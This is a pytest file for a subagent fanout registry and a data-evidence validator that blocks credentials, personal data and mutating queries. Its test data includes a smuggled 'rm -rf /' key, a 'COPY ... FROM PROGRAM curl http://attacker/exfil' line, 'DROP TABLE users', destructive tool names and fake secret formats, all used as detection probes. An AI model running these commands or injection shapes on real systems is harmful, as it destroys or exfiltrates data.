    handler = InterviewHandler(data_dir=tmp_path, fanout_registry=FanoutRegistry())
    registry = handler._resolved_fanout_registry()
    assert registry is not None
    assert registry.directory == tmp_path / "fanout"


# --------------------------------------------------------------------------- #
# Handler-level: lateral producer registers + submit tool re-entry
# --------------------------------------------------------------------------- #


@pytest.mark.asyncio
async def test_lateral_handler_registers_fanout_and_submit_tool_synthesizes(
    tmp_path: Any,
) -> None:
    registry = FanoutRegistry(tmp_path)
    handler = LateralThinkHandler(
        agent_runtime_backend="gemini",  # -> SEQUENTIAL inline path
        fanout_registry=registry,
    )
    personas = ["researcher", "contrarian", "simplifier"]
    result = await handler.handle(
        {
            "problem_context": "stuck on a milestone question",
            "current_approach": "keep asking the same thing",
            "personas": personas,
        }
    )
    assert result.is_ok, result
    meta = result.unwrap().meta
    fanout_id = meta["fanout_id"]
    assert meta["host_action"] == "process_payloads_sequentially"

    # Round-16 ownership boundary: sessionless lateral dispatches stamp a
    # generated owner token that the submitter must echo.
    owner_session = meta["session_id"]
    assert owner_session.startswith("lateral-")

    submit = SubmitFanoutResultsHandler(fanout_registry=registry)
    submit_result = await submit.handle(
        {
            "session_id": owner_session,
            "correlation_key": "context.persona",
            "fanout_id": fanout_id,
            "results": [{"key": p, "content": f"{p}-out"} for p in personas],
        }
    )
    assert submit_result.is_ok, submit_result
    out = submit_result.unwrap().meta
    assert out["status"] == "complete"

    # A caller WITHOUT the stamped owner token is rejected — the boundary
    # the generated identity exists to enforce.
    foreign = await submit.handle(
        {
            "session_id": "some-other-session",
            "correlation_key": "context.persona",
            "fanout_id": fanout_id,
            "results": [],
        }
    )
    assert foreign.is_ok
    assert foreign.unwrap().meta["status"] == "correlation_mismatch"
    assert out["result"]["ready_for_synthesis"] is True


@pytest.mark.asyncio
async def test_lateral_handler_without_registry_stamps_no_fanout_id() -> None:
    handler = LateralThinkHandler(agent_runtime_backend="gemini")
    result = await handler.handle(
        {
            "problem_context": "stuck",
            "current_approach": "same",
            "personas": ["researcher", "contrarian"],
        }
    )
    assert result.is_ok, result
    assert "fanout_id" not in result.unwrap().meta


@pytest.mark.asyncio
async def test_submit_tool_requires_fanout_id() -> None:
    submit = SubmitFanoutResultsHandler()
    result = await submit.handle({"results": []})
    assert result.is_err


@pytest.mark.asyncio
async def test_submit_tool_bounds_input_size(tmp_path: Any) -> None:
    """Re-entry input is bounded before validation or persistence.

    Bot-review round-5 probe (PR #1703): two 200 KB results produced an
    804 KB terminal file; repeated submissions could exhaust memory or disk.
    """
    submit = SubmitFanoutResultsHandler(fanout_registry=FanoutRegistry(tmp_path))

    too_many = await submit.handle(
        {
            "fanout_id": "fanout_bounds",
            "results": [{"key": f"k{i}", "content": "x"} for i in range(33)],
        }
    )
    assert too_many.is_err

    too_big = await submit.handle(
        {
            "fanout_id": "fanout_bounds",
            "results": [{"key": "a", "content": "y" * 300_000}],
        }
    )
    assert too_big.is_err

    # Round-6 probe: non-dict items count against the caps too — 33 strings
    # (330 KB) previously bypassed both limits by being filtered out first.
    non_dict_flood = await submit.handle(
        {
            "fanout_id": "fanout_bounds",
            "results": ["y" * 10_000 for _ in range(33)],
        }
    )
    assert non_dict_flood.is_err

    non_dict_big = await submit.handle(
        {
            "fanout_id": "fanout_bounds",
            "results": ["y" * 300_000],
        }
    )
    assert non_dict_big.is_err


def test_known_data_tools_env_reaches_the_data_lane(monkeypatch: Any) -> None:
    """OUROBOROS_KNOWN_DATA_TOOLS is the public source for known_data_tools.

    Round-5 suggestion: previously only manually constructed lane metadata
    could exercise the contract field's prompt/context propagation.
    """
    monkeypatch.setenv("OUROBOROS_KNOWN_DATA_TOOLS", "clickhouse_query, metabase_card")
    meta: dict[str, Any] = {}
    _attach_question_assist_requests(
        meta,
        session_id="sess-known-tools",
        question="Which plan tier do most active users hit?",
        phase="answer",
        score=None,
        dispatch_mode=SubagentDispatchMode.HOST_DRIVEN,
        runtime_backend="codex",
    )
    lanes = {lane["lane_id"]: lane for lane in meta["question_advisory_request"]["lanes"]}
    assert lanes["data_context"]["known_data_tools"] == ["clickhouse_query", "metabase_card"]


def test_non_object_non_text_content_is_malformed(tmp_path: Any) -> None:
    """Content outside the public object-or-text contract never accumulates.

    Bot-review round-35 probe: submitting ``False`` and ``[]`` for the two
    required lanes returned ``complete``, persisted both values, and
    produced them as synthesized outputs.
    """
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout(
        registry,
        session_id="sess-nonobject",
        payloads=_mixed_advisory_payloads(),
    )
    out = submit_fanout_results(
        registry,
        session_id="sess-nonobject",
        correlation_key="context.lane_id",
        results=[
            {"key": "ambiguity_contrarian", "content": False},
            {"key": "answer_simplifier", "content": []},
        ],
        fanout_id=fanout_id,
    )
    assert out["status"] == "partial"
    assert out["missing_required_keys"] == ["ambiguity_contrarian", "answer_simplifier"]
    assert out["malformed_keys"] == ["ambiguity_contrarian", "answer_simplifier"]
    record = registry.load(fanout_id)
    assert record is not None
    assert record.received_results == {}

    # Contract-conforming shapes still complete: text AND object forms.
    out = submit_fanout_results(
        registry,
        session_id="sess-nonobject",
        correlation_key="context.lane_id",
        results=[
            {"key": "ambiguity_contrarian", "content": "a plain string finding"},
            {"key": "answer_simplifier", "content": {"summary": "an object finding"}},
        ],
        fanout_id=fanout_id,
    )
    assert out["status"] == "complete"


def test_alphabetic_bearer_assignment_is_rejected() -> None:
    """A bearer ASSIGNMENT is a secret regardless of alphabet (round-35)."""
    from ouroboros.contracts.data_evidence import _data_evidence_boundary_violations

    leaked = _minimal_data_output("access via bearer=abcdefghijklmno for 3 accounts")
    assert any("secret" in error for error in _data_evidence_boundary_violations(leaked))
    # Prose ABOUT bearer tokens (no assignment) stays valid.
    prose = _minimal_data_output("active bearer sessions: 42 across 12 tenants")
    assert _data_evidence_boundary_violations(prose) == []


def test_root_ref_chain_of_64_hops_stays_enforceable() -> None:
    """The root-ref grammar has no length limit (round-35 probe).

    A valid Draft 2020-12 contract whose root is a 64-hop local
    root-reference chain passed ``check_schema`` but lost enforcement to a
    numeric hop cap, silently storing no lane contract.
    """
    from ouroboros.mcp.tools.subagent import _enforceable_lane_contract

    defs: dict[str, Any] = {}
    for i in range(64):
        defs[f"d{i}"] = {"$ref": f"#/$defs/d{i + 1}"}
    defs["d64"] = {
        "type": "object",
        "required": ["finding"],
        "properties": {"finding": {"type": "string"}},
    }
    chain_contract = {
        "contract_id": "root_chain.v1",
        "response_model_schema": {"$ref": "#/$defs/d0", "$defs": defs},
    }
    assert _enforceable_lane_contract(chain_contract)


def test_empty_object_content_is_malformed(tmp_path: Any) -> None:
    """An empty object is the object-form blank string (round-36 probe).

    ``{}`` for both default required lanes previously returned ``complete``,
    persisted them, and produced an empty aggregation.
    """
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout(
        registry,
        session_id="sess-empty-object",
        payloads=_mixed_advisory_payloads(),
    )
    out = submit_fanout_results(
        registry,
        session_id="sess-empty-object",
        correlation_key="context.lane_id",
        results=[
            {"key": "ambiguity_contrarian", "content": {}},
            {"key": "answer_simplifier", "content": {}},
        ],
        fanout_id=fanout_id,
    )
    assert out["status"] == "partial"
    assert out["malformed_keys"] == ["ambiguity_contrarian", "answer_simplifier"]
    record = registry.load(fanout_id)
    assert record is not None
    assert record.received_results == {}


def test_credential_prefixed_opaque_identifier_is_rejected() -> None:
    """Credential-prefixed identifiers fail closed (round-36 probe).

    ``api_key_staging_XYZ12345`` was classified safe because its opaque
    suffix is non-hex; the rule is now inverted — every suffix token must be
    a recognizable word or tag for the identifier to stay exempt.
    """
    from ouroboros.contracts.data_evidence import (
        _data_evidence_boundary_violations,
        _identifier_looks_secret,
    )

    assert _identifier_looks_secret("api_key_staging_XYZ12345")
    assert _identifier_looks_secret("api_key_prod_123abc")
    assert _identifier_looks_secret("api_key_live_supersecret")
    # Word/tag-suffixed identifiers keep naming read-only data tools.
    assert not _identifier_looks_secret("token_usage_v2")
    assert not _identifier_looks_secret("key_metrics_30d")

    leaked = _minimal_data_output("42 active keys")
    leaked["evidence"][0]["source"] = "api_key_staging_XYZ12345"
    assert any("credential" in error for error in _data_evidence_boundary_violations(leaked))


def test_ref_sibling_object_intermediate_stays_enforceable() -> None:
    """Intermediate ``$ref`` siblings combine conjunctively (round-36 probe).

    A chain node declaring ``type: object`` ALONGSIDE its ``$ref`` forces
    object instances even when the final target declares no type; dropping
    it silently stored no lane contract and let ``{}`` terminalize the
    required lane.
    """
    from ouroboros.mcp.tools.subagent import _enforceable_lane_contract

    sibling_contract = {
        "contract_id": "sibling_chain.v1",
        "response_model_schema": {
            "$ref": "#/$defs/mid",
            "$defs": {
                "mid": {
                    "type": "object",
                    "$ref": "#/$defs/leaf",
                    "required": ["finding"],
                },
                "leaf": {"properties": {"finding": {"type": "string"}}},
            },
        },
    }
    assert _enforceable_lane_contract(sibling_contract)


def test_destructive_tool_hints_are_filtered(monkeypatch: Any) -> None:
    """Destructive-verb synonyms never become preferred tools (round-37).

    ``destroy_database,remove_user,rename_database`` were all advertised as
    known data tools, steering a broadly permitted child toward destructive
    operations before any post-execution validation could matter.
    """
    monkeypatch.setenv(
        "OUROBOROS_KNOWN_DATA_TOOLS",
        "destroy_database, remove_user, rename_database, clickhouse_query",
    )
    meta: dict[str, Any] = {}
    _attach_question_assist_requests(
        meta,
        session_id="sess-destructive-hints",
        question="Which plan tier do most active users hit?",
        phase="answer",
        score=None,
        dispatch_mode=SubagentDispatchMode.HOST_DRIVEN,
        runtime_backend="codex",
    )
    lanes = {lane["lane_id"]: lane for lane in meta["question_advisory_request"]["lanes"]}
    assert lanes["data_context"]["known_data_tools"] == ["clickhouse_query"]


def test_long_alphabetic_credential_suffixes_fail_closed(monkeypatch: Any) -> None:
    """A 13+-char alphabetic run after a credential prefix is opaque
    (round-37 probes: api_key_abcdefghijklmnop, bearer_abcdefghijklmnop)."""
    from ouroboros.contracts.data_evidence import _identifier_looks_secret

    assert _identifier_looks_secret("api_key_abcdefghijklmnop")
    assert _identifier_looks_secret("bearer_abcdefghijklmnop")
    # Real tool vocabulary stays exempt — words, version and window tags.
    assert not _identifier_looks_secret("token_usage_v2")
    assert not _identifier_looks_secret("key_metrics_30d")
    assert not _identifier_looks_secret("token_aggregation_warehouse")

    # Config-side alignment: a credential-shaped hint is dropped at
    # configuration with the SAME classifier, so a surviving hint can never
    # be delivered and then rejected at re-entry.
    monkeypatch.setenv("OUROBOROS_KNOWN_DATA_TOOLS", "api_key_abcdefghijklmnop, metabase_card")
    meta: dict[str, Any] = {}
    _attach_question_assist_requests(
        meta,
        session_id="sess-secret-hints",
        question="Which plan tier do most active users hit?",
        phase="answer",
        score=None,
        dispatch_mode=SubagentDispatchMode.HOST_DRIVEN,
        runtime_backend="codex",
    )
    lanes = {lane["lane_id"]: lane for lane in meta["question_advisory_request"]["lanes"]}
    assert lanes["data_context"]["known_data_tools"] == ["metabase_card"]


def test_combinator_depth_never_binds_before_the_size_budget() -> None:
    """The DECLARED budget, not an undocumented cap, bounds nesting
    (round-37 probe: 33 nested allOf nodes).

    The depth cap sits at 128 while a MINIMAL 33-deep allOf chain already
    renders 9,892 canonical chars — over the 8,000-char deliverable-whole
    budget — so the only reachable rejection is the declared one. The
    deepest sub-budget chains stay enforceable.
    """
    from ouroboros.mcp.tools.subagent import (
        _INTERVIEW_ADVISORY_MAX_CONTRACT_CHARS,
        _canonical_contract_json,
        _enforceable_lane_contract,
    )

    def _chain(depth: int) -> dict[str, Any]:
        node: dict[str, Any] = {"type": "object"}
        for _ in range(depth):
            node = {"allOf": [node]}
        return {"contract_id": "deep_allof.v1", "response_model_schema": node}

    # Sub-budget deep nesting is enforceable — the old cap of 32 is gone
    # as a reachable boundary.
    assert _enforceable_lane_contract(_chain(25))
    assert _enforceable_lane_contract(_chain(33))
    # 33-deep CANNOT be sub-budget in the canonical serialization: its
    # minimal form already exceeds the declared budget, so it is rejected
    # by contract (deliverable-whole), not by an undocumented cap.
    rendered = _canonical_contract_json(_chain(40))
    assert rendered is not None and len(rendered) > _INTERVIEW_ADVISORY_MAX_CONTRACT_CHARS
    assert not _enforceable_lane_contract(_chain(40))


def test_credential_word_marks_identifier_from_any_position() -> None:
    """A credential word is a credential word wherever it sits (round-38).

    ``access_key_abcd1234`` wore the identifier exemption because "access"
    led the name; the classifier now looks for the credential word at ANY
    token position and applies the same fail-closed suffix rule.
    """
    from ouroboros.contracts.data_evidence import (
        _data_evidence_boundary_violations,
        _identifier_looks_secret,
    )

    for value in (
        "access_key_abcd1234",
        "client_secret_9fh2",
        "refresh_token_abc123XY",
        # Round 33-37 pins keep holding.
        "api_key_staging_XYZ12345",
        "api_key_live_supersecret",
        "api_key_abcdefghijklmnop",
    ):
        assert _identifier_looks_secret(value), value

    # The exemption is granted only to a LEADING credential word with a
    # word-like tail (round-40): qualifier-prefixed forms are credential
    # names, so bigquery_keys_daily and s3_key_prefix_scan are no longer
    # exempt — see the round-40 pin below.
    for value in (
        "token_usage_v2",
        "key_metrics_30d",
        "token_aggregation_warehouse",
        "clickhouse_query",
        "keys_daily_rollup",
    ):
        assert not _identifier_looks_secret(value), value

    leaked = _minimal_data_output("42 active accounts")
    leaked["evidence"][0]["source"] = "access_key_abcd1234"
    assert any("credential" in error for error in _data_evidence_boundary_violations(leaked))


def test_violation_paths_never_echo_submitter_chosen_names() -> None:
    """Violation LOCATIONS are content when the submitter named them.

    Round-38 probe: an additive lane submitting ``{"alice@example.com": …}``
    produced ``$['alice@example.com']: violates 'type'``, and that address
    then rode the persisted terminal record. Only property names the CONTRACT
    declares are echoed.
    """
    from ouroboros.mcp.tools.subagent import _lane_answer_contract_violations

    contracts = {
        "add_lane": {
            "contract_id": "add.v1",
            "response_model_schema": {
                "type": "object",
                "properties": {"finding": {"type": "string"}},
                "additionalProperties": {"type": "number"},
            },
        }
    }
    violations = _lane_answer_contract_violations(
        contracts, {"add_lane": {"alice@example.com": "secret", "finding": 5}}
    )
    errors = violations[0]["errors"]
    assert not any("alice@example.com" in error for error in errors), errors
    assert any("<redacted-key sha256:" in error for error in errors), errors
    # DECLARED names stay readable — the report must still locate the fault.
    assert any(error.startswith("$.finding:") for error in errors), errors


def test_unenforceable_contract_is_not_advertised_in_payload_context(tmp_path: Any) -> None:
    """Advertised IFF enforced — on the machine-readable surfaces too.

    Round-38 probe: an oversized contract was correctly omitted from the
    child prompt and from registry enforcement, yet its full form survived
    under ``payload.context.answer_contract``, so a host reading the payload
    would follow a form re-entry silently ignores.
    """
    from ouroboros.mcp.tools.subagent import (
        build_interview_question_advisory_subagents,
        published_lane_contract_fields,
    )

    oversized = {
        "contract_id": "oversized.v1",
        "response_model_schema": {
            "type": "object",
            "properties": {
                f"field_{index}": {"type": "string", "description": "x" * 300}
                for index in range(60)
            },
        },
    }
    payloads = build_interview_question_advisory_subagents(
        {
            "session_id": "sess-advertise",
            "question_identity": "interview-question:0123456789abcdef",
            "question": "Which retention window applies?",
            "lanes": [
                {
                    "lane_id": "additive_lane",
                    "capability": "future_capability",
                    "required": False,
                    "answer_contract": oversized,
                }
            ],
        }
    )
    context = payloads[0].to_dict()["context"]
    assert "answer_contract" not in context
    published = context["answer_contract_unenforced"]
    assert published["enforced"] is False
    assert "response_model_schema" not in published
    assert published["contract_id"] == "oversized.v1"

    # An ENFORCEABLE contract is published verbatim — the filter is the
    # enforceability decision, not a blanket strip.
    enforceable = {
        "contract_id": "small.v1",
        "response_model_schema": {"type": "object", "properties": {"finding": {"type": "string"}}},
    }
    assert published_lane_contract_fields(enforceable) == {"answer_contract": enforceable}


def test_compound_credential_assignments_are_rejected() -> None:
    """A credential word marks the assignment from any position (round-39).

    ``client_secret=…`` and ``refresh_token=…`` evaded the content scan
    because the pattern anchored the credential word at a word boundary, and
    an underscore is a word character — so the compound name hid it. The same
    position-independent vocabulary the identifier classifier uses now applies
    to the assignment shape.
    """
    from ouroboros.contracts.data_evidence import _data_evidence_boundary_violations

    for value in (
        "client_secret=abcdefghijk 42 users",
        "refresh_token=abcdefghijk 42 users",
        "private_key=abcdefghijk 42 users",
        "aws_secret_access_key=abcdefghijk 7 rows",
        # Round-34/35 pins keep holding.
        "api_key=supersecret 42 users",
    ):
        assert any(
            "credential-assignment-shaped" in error
            for error in _data_evidence_boundary_violations(_minimal_data_output(value))
        ), value

    for value in (
        "42 active users",
        "signup rate 3.2% across 12,400 sessions",
        "p95 latency 240 ms over 8,100 calls",
    ):
        assert _data_evidence_boundary_violations(_minimal_data_output(value)) == [], value


def test_unenforced_contract_marker_is_a_valid_v1_lane(tmp_path: Any) -> None:
    """The non-enforced marker may not break the lane schema it protects.

    Round-39: publishing the marker INSIDE ``answer_contract`` produced a lane
    that fails its own public v1 schema (``response_model_schema`` is
    required there), so the additive-compatibility promise the marker exists
    to keep honest was the thing it broke. The marker now rides a sibling
    field and the lane simply carries no ``answer_contract``.
    """
    from jsonschema import Draft202012Validator

    from ouroboros.mcp.tools.subagent import (
        lanes_with_published_contracts,
        register_question_advisory_fanout_from_lanes,
    )
    from ouroboros.orchestrator.capabilities import ouroboros_tool_capability_metadata

    advisory = ouroboros_tool_capability_metadata("ouroboros_interview")["orchestration"][
        "question_advisory_fanout"
    ]
    lane_schema = advisory["request_model_schema"]["properties"]["lanes"]["items"]
    validator = Draft202012Validator(lane_schema)

    oversized = {
        "contract_id": "oversized.v1",
        "response_model_schema": {
            "type": "object",
            "properties": {
                f"field_{index}": {"type": "string", "description": "x" * 300}
                for index in range(60)
            },
        },
    }
    published = lanes_with_published_contracts(
        [
            {
                "lane_id": "additive_lane",
                "purpose": "A lane added after this engine shipped.",
                "capability": "future_capability",
                "required": False,
                "answer_contract": oversized,
            }
        ]
    )[0]
    assert "answer_contract" not in published
    assert published["answer_contract_unenforced"]["contract_id"] == "oversized.v1"
    assert list(validator.iter_errors(published)) == []

    # Every SHIPPED lane still validates after publication, contract intact.
    for lane in lanes_with_published_contracts(advisory["lanes"]):
        assert list(validator.iter_errors(lane)) == [], lane["lane_id"]
        if lane["lane_id"] == "data_context":
            assert lane["answer_contract"]["contract_id"] == "data_evidence_answer.v1"

    # The data lane's fail-closed minimal contract survives the publication
    # split: registration reads the DECLARATION, enforceable or not.
    registry = FanoutRegistry(tmp_path)
    unenforceable_data_lane = lanes_with_published_contracts(
        [
            {
                "lane_id": "data_context",
                "purpose": "Data evidence.",
                "capability": "call_mcp",
                "required": False,
                "answer_contract": oversized,
            }
        ]
    )
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-marker", lanes=unenforceable_data_lane
    )
    assert fanout_id is not None
    record = registry.load(fanout_id)
    assert record is not None
    contracts = record.synthesizer_input["lane_answer_contracts"]
    fallback_schema = contracts["data_context"]["response_model_schema"]
    assert fallback_schema["properties"]["requires_user_confirmation"] == {"const": True}


def test_error_shaped_finding_is_not_evidence() -> None:
    """The error-shape rule binds the FINDING too (round-40 probe).

    A contract-valid result whose ``finding`` narrates "the query failed
    because access was denied" shipped alongside evidence and persisted —
    contradicting ``error_shaped_tool_output=return_no_evidence_finding``.
    The condition matches the caveats rule: the contradiction requires
    evidence to exist, so a no-op legitimately narrates why nothing ran.
    """
    from ouroboros.contracts.data_evidence import _data_evidence_boundary_violations

    for finding in (
        "The query failed because access was denied to the analytics dataset.",
        "Lookup returned error: permission denied.",
        "The request timed out before returning rows.",
    ):
        failed = _minimal_data_output("42 active users")
        failed["finding"] = finding
        assert any(
            "describes a failed lookup" in error
            for error in _data_evidence_boundary_violations(failed)
        ), finding

    # A NO-OP narrates the absence of a lookup and must stay valid.
    noop = {
        "lane_id": "data_context",
        "data_needed": False,
        "finding": "No data lookup was needed; this runtime has no MCP data tools available.",
        "confidence": "no_evidence",
        "evidence": [],
        "proposed_queries": [],
        "requires_user_confirmation": True,
        "caveats": ["No query was executed."],
    }
    assert _data_evidence_boundary_violations(noop) == []

    # Ordinary findings alongside evidence stay valid.
    ordinary = _minimal_data_output("42 active users")
    ordinary["finding"] = "Weekly active users grew 12% over the last 30 days."
    assert _data_evidence_boundary_violations(ordinary) == []


def test_credential_identifier_exemption_is_position_scoped() -> None:
    """The exemption is narrow and verified, not "any alphabetic tail".

    Round-40 probes ``password_swordfish``, ``client_secret_huntertwo``, and
    ``refresh_token_alphabetic`` all carried word-like tails. Words that never
    name a data tool (password/secret/bearer/credential) now reject outright,
    and for the analytics-plausible words (token/key) the exemption survives
    only while the credential word LEADS — English compounds put the head
    last, so a qualifier before it (refresh_token, access_key, private_key)
    names a credential.
    """
    from ouroboros.contracts.data_evidence import (
        _data_evidence_boundary_violations,
        _identifier_looks_secret,
    )

    for value in (
        "password_swordfish",
        "client_secret_huntertwo",
        "refresh_token_alphabetic",
        "private_key_material",
        # Qualifier-prefixed forms that previously rode the exemption.
        "s3_key_prefix_scan",
        "bigquery_keys_daily",
        "warehouse_token_usage_v2",
        # Rounds 33-38 pins keep holding.
        "access_key_abcd1234",
        "api_key_staging_XYZ12345",
        "api_key_abcdefghijklmnop",
        "bearer_abcdefghijklmnop",
    ):
        assert _identifier_looks_secret(value), value

    # A LEADING credential word with a word-like tail is tool vocabulary.
    for value in (
        "token_usage_v2",
        "key_metrics_30d",
        "token_aggregation_warehouse",
        "keys_daily_rollup",
        "clickhouse_query",
    ):
        assert not _identifier_looks_secret(value), value

    leaked = _minimal_data_output("42 active accounts")
    leaked["evidence"][0]["source"] = "password_swordfish"
    assert any("credential" in error for error in _data_evidence_boundary_violations(leaked))


def test_uri_userinfo_credentials_are_rejected() -> None:
    """A ``scheme://user:password@host`` URI carries the secret structurally.

    Round-41 probe: ``endpoint=https://alice:swordfish@localhost:8443``
    contains no credential WORD, so every word-anchored pattern missed it.
    """
    from ouroboros.contracts.data_evidence import _data_evidence_boundary_violations

    for value in (
        "count=1; endpoint=https://alice:swordfish@localhost:8443",
        "42 users via postgres://admin:hunter2@db.internal:5432/analytics",
    ):
        assert _data_evidence_boundary_violations(_minimal_data_output(value)) != [], value

    # Ordinary endpoint URLs (no userinfo) stay valid.
    for value in (
        "42 active users from https://metabase.internal/api/card/12",
        "p95 240 ms across https://warehouse.example.com:8443/query",
    ):
        assert _data_evidence_boundary_violations(_minimal_data_output(value)) == [], value


def test_nested_result_content_does_not_recurse() -> None:
    """Caller-controlled nesting depth may not crash request validation.

    Round-42 probe: a 1,200-level object under ``results[*].content`` raised
    an uncaught RecursionError inside ``SecurityLayer.check_request`` — before
    any handler size check. The walk is iterative now, and exempt subtrees are
    skipped DURING traversal so exempt content costs nothing to descend.
    """
    from ouroboros.mcp.server.security import InputValidator

    deep: Any = {"leaf": "42 active users"}
    for _ in range(1_200):
        deep = {"nested": deep}

    validator = InputValidator()
    result = validator.validate(
        "ouroboros_submit_fanout_results",
        {
            "session_id": "sess-deep",
            "correlation_key": "context.lane_id",
            "results": [{"key": "data_context", "content": deep}],
        },
    )
    assert result.is_ok

    # Routing fields around the exempt subtree stay validated at depth.
    rejected = validator.validate(
        "ouroboros_submit_fanout_results",
        {
            "session_id": "sess-deep",
            "correlation_key": "context.lane_id",
            "results": [{"key": "data; rm -rf /", "content": {"finding": "ok"}}],
        },
    )
    assert rejected.is_err


def test_vendor_token_prefixes_are_one_vocabulary() -> None:
    """The content scan and the identifier classifier share one prefix list.

    Round-42 probe: ``xoxb-123456789-abcdefghij`` passed the CONTENT scan
    because it knew ``xox`` while the identifier classifier knew ``xox[a-z]``.
    """
    from ouroboros.contracts.data_evidence import (
        _data_evidence_boundary_violations,
        _identifier_looks_secret,
    )

    for value in (
        "xoxb-123456789-abcdefghij; count=42",
        "xoxp-99887766-zzz111; 7 rows",
        "ghp_abcd1234efgh5678; 3 repos",
    ):
        assert any(
            "credential" in error
            for error in _data_evidence_boundary_violations(_minimal_data_output(value))
        ), value

    # Both surfaces agree on the same token.
    assert _identifier_looks_secret("xoxb-123456789-abcdefghij")


def test_repeated_identity_tokens_are_rows_in_any_prose_field() -> None:
    """Several ids under one label are a column, whatever the delimiter.

    Round-42 probe: ``"user-123 has 12 seats / user-456 has 13 seats"`` used
    " / " to evade the comma and semicolon row forms. Repetition of the
    identity token is the row signature and is delimiter-independent.
    """
    from ouroboros.contracts.data_evidence import _data_evidence_boundary_violations

    for rows in (
        "user-123 has 12 seats / user-456 has 13 seats",
        "acct_4471 12 seats | acct_4472 13 seats",
    ):
        with_finding = _minimal_data_output("42 active users")
        with_finding["finding"] = rows
        assert any(
            "row-shaped" in error for error in _data_evidence_boundary_violations(with_finding)
        ), rows

        with_caveat = _minimal_data_output("42 active users")
        with_caveat["caveats"] = [rows]
        assert any(
            "row-shaped" in error for error in _data_evidence_boundary_violations(with_caveat)
        ), rows

    # A single reference and ordinary aggregates stay valid.
    for prose in (
        "Weekly active users grew 12% over the last 30 days.",
        "Growth in region-01 was 12% against the 30-day baseline.",
    ):
        ordinary = _minimal_data_output("42 active users")
        ordinary["finding"] = prose
        assert _data_evidence_boundary_violations(ordinary) == [], prose


def test_evidence_requires_a_succeeded_execution() -> None:
    """The failed-call rule is a TYPED contract term (round-42/43).

    Recognizing failure vocabulary in a free-text value was a detector that
    every round found one more phrase around. Evidence now requires a declared
    ``execution_status: succeeded`` — anything else, including an undeclared
    outcome, is a located violation — and the value itself is a typed
    aggregate, so a failure narrative has no field to occupy. The vocabulary
    scan survives only over the advisory prose the human reads.
    """
    from ouroboros.contracts.data_evidence import _data_evidence_boundary_violations

    for status in ("failed", "timeout", "partial"):
        failed = _minimal_data_output("42 active users")
        failed["evidence"][0]["execution_status"] = status
        assert any(
            "requires a succeeded execution" in error
            for error in _data_evidence_boundary_violations(failed)
        ), status

    undeclared = _minimal_data_output("42 active users")
    del undeclared["evidence"][0]["execution_status"]
    assert any(
        "requires a succeeded execution" in error
        for error in _data_evidence_boundary_violations(undeclared)
    )

    # The vocabulary scan stays as defense-in-depth against a contradicting
    # narrative shipped under a "succeeded" status.
    for value in (
        "lookup unsuccessful; attempts=3",
        "query was not successful, 0 rows",
        "unable to reach the warehouse endpoint 3 times",
    ):
        contradicting = _minimal_data_output(value)
        assert any(
            "describes a failed lookup" in error
            for error in _data_evidence_boundary_violations(contradicting)
        ), value

    assert _data_evidence_boundary_violations(_minimal_data_output("42 active users")) == []


def test_forbidden_content_classes_are_unrepresentable_not_filtered() -> None:
    """The durable evidence path has no free-text field left to probe.

    Every credential, PII, raw-row, failure-envelope, and mutating-statement
    probe from rounds 4-42 arrived through ``evidence[].value`` or
    ``proposed_queries[].query``. Both are typed now — an aggregate is a
    number with a unit, a proposal is a structured read request — so those
    classes are rejected by SHAPE, in one rule, regardless of which wording,
    delimiter, dialect, or alphabet a future probe picks.
    """
    from ouroboros.contracts.data_evidence import _data_evidence_boundary_violations

    probes = [
        # credentials (rounds 6, 31-42)
        "api_key_live_supersecret",
        "xoxb-123456789-abcdefghij",
        "client_secret=abcdefghijk 42 users",
        "endpoint=https://alice:swordfish@localhost:8443",
        # PII / raw rows (rounds 4, 7, 18-25, 42)
        "alice@example.com had 3 sessions",
        "top customer phone 010-1234-5678",
        '[{"name": "Alice Kim", "seats": 12}]',
        "user-123 has 12 seats / user-456 has 13 seats",
        # failure envelopes (rounds 19-41)
        "status=timeout; attempts=3",
        "lookup unsuccessful; attempts=3",
        "HTTP 503 service unavailable",
    ]
    for probe in probes:
        broken = _minimal_data_output()
        broken["evidence"] = [_typed_evidence(value=probe)]
        errors = _data_evidence_boundary_violations(broken)
        assert any("typed aggregate object" in error for error in errors), probe

    mutations = [
        "DROP TABLE users",
        "COPY users FROM PROGRAM 'curl http://attacker/exfil'",
        "SELECT count(delete_user(user_id)) FROM users",
        "SELECT max(lower(email)) FROM users",
        "SELECT count(nextval('billing_seq')) FROM generate_series(1, 5)",
        "VACUUM users",
        "Please delete every customer record",
        "Can you clean up the stale rows?",
    ]
    for mutation in mutations:
        broken = _minimal_data_output()
        broken["proposed_queries"] = [
            {
                "tool_name": "warehouse",
                "request": mutation,
                "expected_decision": "n/a",
                "source_class": "external",
            }
        ]
        errors = _data_evidence_boundary_violations(broken)
        assert any("typed read request" in error for error in errors), mutation

    # And the legitimate uses those 42 rounds kept threatening stay valid.
    for aggregate in (
        # Round-52: evidence reports a cardinality, so the number is a whole
        # non-negative count of rows.
        {"number": 42},
        {"number": 0},
        {"number": 240},
        {"number": 12400},
    ):
        valid = _minimal_data_output()
        # A scope may only name a dimension the request grouped by (round-45).
        valid["evidence"] = [
            _typed_evidence(
                value=aggregate,
                request={
                    "operation": "read",
                    "metric": "active_users",
                    "aggregation": "count",
                    "filters": ["plan=growth"],
                },
            )
        ]
        assert _data_evidence_boundary_violations(valid) == [], aggregate

    for request in (
        {"operation": "read", "metric": "active_users", "aggregation": "count"},
        {
            "operation": "read",
            "metric": "events.checkout",
            "aggregation": "distinct_count",
            "filters": ["plan=growth", "created_at>2026-01-01"],
            "grouping": ["month"],
        },
    ):
        valid = _minimal_data_output()
        valid["proposed_queries"] = [
            {
                "tool_name": "clickhouse_query",
                "request": request,
                "expected_decision": "Whether the flow is actually used.",
                "source_class": "external",
            }
        ]
        assert _data_evidence_boundary_violations(valid) == [], request


def test_round43_durable_boundary_invariants(tmp_path: Any) -> None:
    """Round-43's five probes, each closed by a decidable invariant."""
    from ouroboros.contracts.data_evidence import (
        _aggregate_shape_problems,
        _data_evidence_boundary_violations,
        _identifier_looks_secret,
        _read_request_shape_problems,
    )

    # B1 — confirmation is a code-level invariant, so a degraded fallback
    # contract cannot let a skipped confirmation through.
    assert any(
        "requires_user_confirmation" in error
        for error in _data_evidence_boundary_violations(
            {"finding": "No confirmation was requested.", "requires_user_confirmation": False}
        )
    )

    # B2 — the typed grammar no longer admits identity-scoped evidence.
